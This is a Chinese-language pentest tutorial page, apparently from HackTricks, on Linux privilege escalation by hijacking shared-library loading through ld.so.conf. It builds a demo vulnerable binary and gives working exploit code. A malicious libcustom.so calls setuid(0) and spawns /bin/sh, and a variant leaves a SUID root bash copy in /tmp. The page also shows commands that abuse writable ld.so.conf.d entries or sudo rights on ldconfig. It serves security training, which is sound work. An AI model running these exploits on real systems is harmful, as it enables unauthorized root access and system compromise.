# ld.so privesc exploit 示例

{{#include ../../banners/hacktricks-training.md}}

## 准备环境

在以下部分中，你可以找到我们将用于准备环境的文件代码

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **在**同一文件夹中在你的机器上**创建**这些文件
2. **编译** **library**：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. 将 `libcustom.so` **复制**到 `/usr/lib` 并刷新缓存：`sudo cp libcustom.so /usr/lib && sudo ldconfig`（需要 root 权限）
4. **编译** **executable**：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

检查 _libcustom.so_ 是否从 _/usr/lib_ **加载**，并确认你可以**执行**该 binary。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 有用的 triage 命令

攻击真实目标时，请确认 binary 所需的 **exact library name**，以及 loader **currently resolving** 的内容：
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
几个有用的易踩坑点：

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` 通常**无法正常工作**，因为重定向由当前 shell 执行。请改用
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`。
- **SUID/privileged** 二进制文件在 **secure-execution mode** 下会忽略
`LD_LIBRARY_PATH`/`LD_PRELOAD`，但来自 `/etc/ld.so.conf` 的目录仍属于受信任的 loader 配置，因此这种错误配置仍可能影响 privileged 程序。
- 在较新的 glibc 版本中，dynamic loader 还提供了
`--list-diagnostics`，当 hijack 行为不符合预期时，可以使用它调试 cache resolution 以及
`glibc-hwcaps` 子目录选择。

## Exploit

在此场景中，我们假设**有人在** _/etc/ld.so.conf/_ **中的某个文件里创建了一个存在漏洞的条目**：
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
存在漏洞的文件夹是 _/home/ubuntu/lib_（我们对其具有写入权限）。\
**在该路径下下载并编译**以下代码：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
如果你预计之后会由 **root**（或其他特权账户）执行该易受攻击的二进制文件，通常最好留下一个 **root-owned artifact**，而不是生成交互式 shell。例如：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
然后，在特权执行发生后，你可以使用 `/tmp/rootbash -p`。

现在我们已经在配置错误的路径中**创建了恶意的 libcustom 库**，接下来需要等待**重启**，或等待 root 用户执行 **`ldconfig`**（_如果你可以通过 **sudo** 执行此二进制文件，或者它具有 **suid bit**，就可以自行执行它_）。

完成后，**重新检查** `sharedvuln` 可执行文件从何处加载 `libcustom.so` 库：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
正如你所见，它会**从 `/home/ubuntu/lib` 加载**，并且如果任何用户执行它，就会执行一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 注意，在此示例中我们尚未提升权限，但通过修改执行的命令，并**等待 root 或其他特权用户执行存在漏洞的 binary**，我们就能够提升权限。

### 其他错误配置 - 相同的 vuln

在前面的示例中，我们伪造了一种错误配置，其中管理员**将一个非特权文件夹设置在 `/etc/ld.so.conf.d/` 内的配置文件中**。\
但如果你在 `/etc/ld.so.conf.d` 内的某个**配置文件**、文件夹 `/etc/ld.so.conf.d` 或文件 `/etc/ld.so.conf` 中拥有**写权限**，也可能存在其他会导致相同 vulnerability 的错误配置；你可以配置并 exploit 相同的 vulnerability。

## Exploit 2

**假设你对 `ldconfig` 拥有 sudo 权限**。\
你可以指示 `ldconfig` **从哪里加载 conf 文件**，因此我们可以利用这一点，让 `ldconfig` 加载任意文件夹。\
所以，让我们创建加载 "/tmp" 所需的文件和文件夹：
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，如**前一个 exploit**所示，**在 `/tmp` 中创建恶意库**。\
最后，让我们加载该路径，并检查 binary 从哪里加载库：
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**正如你所看到的，拥有对 `ldconfig` 的 sudo 权限，你同样可以利用这一漏洞。**



## 参考资料

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
